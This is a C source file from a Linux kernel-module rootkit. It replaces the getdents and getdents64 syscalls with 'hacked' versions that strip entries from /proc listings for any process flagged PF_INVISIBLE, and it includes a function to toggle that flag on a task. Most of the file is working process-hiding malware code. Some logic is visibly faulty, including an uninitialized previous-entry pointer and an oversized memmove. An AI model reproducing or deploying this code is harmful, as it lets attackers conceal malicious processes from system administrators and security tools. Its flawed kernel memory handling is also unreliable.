#include "../inc/proc.h"

#include <linux/dirent.h>
#include <linux/fdtable.h>

#include "../inc/def.h"
#include "../inc/util.h"

struct task_struct *
find_task_struct(pid_t pid) {
    struct task_struct *task = current;

    for_each_process(task)
        if (task->pid == pid)
            return task;

    return NULL;
}

int
is_invisible_pid(pid_t pid) {
    if (!pid)
        return 0;
    return is_invisible_task_struct(find_task_struct(pid));
}

int
is_invisible_task_struct(struct task_struct *task) {
    if (task)
        return task->flags & PF_INVISIBLE;
    return 0;
}

void
toggle_invisability(struct task_struct *task) {
    if (task)
        task->flags ^= PF_INVISIBLE;
}

asmlinkage long
hacked_proc_getdents(const struct pt_regs *pt_regs) {
    int fd; 
    long off = 0;
    long ret = original_getdents(pt_regs);

    struct inode *d_inode;
    struct linux_dirent *dirent, *kdirent, *dirent_var, *dirent_prev;

    if (ret <= 0)
        return ret;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent *)pt_regs->si;

    d_inode =
        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (d_inode->i_ino != PROC_ROOT_INO)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    for (
            dirent_var = (void *)kdirent + off;
            off < ret;
            off += dirent_var->d_reclen
        ) {
        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
                memmove(
                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
                );
                ret -= dirent_var->d_reclen;
                off -= dirent_var->d_reclen; // because of 'for' loop increasing
            }
            else
                dirent_prev->d_reclen += dirent_var->d_reclen;
        }
        else
            dirent_prev = dirent_var;
    }

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}

asmlinkage long
hacked_proc_getdents64(const struct pt_regs *pt_regs) {
    int fd; 
    long off = 0;
    long ret = original_getdents64(pt_regs);

    struct inode *d_inode;
    struct linux_dirent64 *dirent, *kdirent, *dirent_var, *dirent_prev;

    if (ret <= 0)
        return ret;

    fd = (int)pt_regs->di;
    dirent = (struct linux_dirent64 *)pt_regs->si;

    d_inode =
        current->files->fdt->fd[fd]->f_path.dentry->d_inode;
    if (d_inode->i_ino != PROC_ROOT_INO)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    for (
            dirent_var = (void *)kdirent + off;
            off < ret;
            off += dirent_var->d_reclen
        ) {
        if (is_invisible_pid(str_to_pid(dirent_var->d_name))) {
            if (!dirent_prev) { // <==> if (dirent_var == kdirent)
                memmove(
                    dirent_var, (void *)dirent_var + dirent_var->d_reclen, ret
                );
                ret -= dirent_var->d_reclen;
                off -= dirent_var->d_reclen; // because of 'for' loop increasing
            }
            else
                dirent_prev->d_reclen += dirent_var->d_reclen;
        }
        else
            dirent_prev = dirent_var;
    }

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    return ret;
}
